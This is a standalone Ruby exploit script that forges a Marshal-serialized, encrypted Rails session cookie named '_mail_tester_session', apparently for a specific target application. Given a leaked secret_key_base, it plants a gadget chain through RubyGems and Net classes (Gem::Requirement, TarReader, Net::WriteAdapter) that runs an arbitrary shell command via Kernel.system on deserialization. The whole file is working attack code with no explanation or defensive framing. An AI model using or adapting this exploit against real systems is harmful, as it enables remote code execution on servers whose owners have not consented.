#!/usr/bin/env ruby


require "rails"
require "action_dispatch/middleware/cookies"

Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

class Application < Rails::Application;end


def generate_payload(cookie_name, payload, secret_key_base)
  Rails.application.config.secret_key_base = secret_key_base
  wa1 = Net::WriteAdapter.new(Kernel, :system)

  rs = Gem::RequestSet.allocate
  rs.instance_variable_set('@sets', wa1)
  rs.instance_variable_set('@git_set', payload)

  wa2 = Net::WriteAdapter.new(rs, :resolve)

  i = Gem::Package::TarReader::Entry.allocate
  i.instance_variable_set('@read', 0)
  i.instance_variable_set('@header', "aaa")


  n = Net::BufferedIO.allocate
  n.instance_variable_set('@io', i)
  n.instance_variable_set('@debug_output', wa2)

  t = Gem::Package::TarReader.allocate
  t.instance_variable_set('@io', n)

  r = Gem::Requirement.allocate
  r.instance_variable_set('@requirements', t)

  pp = [Gem::SpecFetcher, Gem::Installer, r]


  request = ActionDispatch::Request.new(Rails.application.env_config)
  request.env["action_dispatch.cookies_serializer"] = :marshal
  cookies = request.cookie_jar

  cookies.encrypted[cookie_name] = pp
  return cookies[cookie_name]
end


cookie_name = :_mail_tester_session
payload = ARGV[0]
secret_key_base = ARGV[1]

puts generate_payload(cookie_name, payload, secret_key_base)